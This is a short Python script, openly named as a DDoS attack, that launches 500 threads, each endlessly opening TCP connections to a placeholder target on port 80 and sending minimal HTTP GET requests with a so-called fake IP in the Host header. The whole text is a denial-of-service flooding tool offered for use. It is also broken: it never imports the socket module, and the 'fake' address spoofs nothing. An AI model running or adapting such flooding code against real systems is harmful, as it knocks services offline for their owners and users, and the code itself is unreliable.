import threading

target_ip = "TARGET_IP_HERE"
target_port = 80
fake_ip = "YOUR_IP_HERE"

def ddos_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

for _ in range(500):
    thread = threading.Thread(target=ddos_attack)
    thread.start()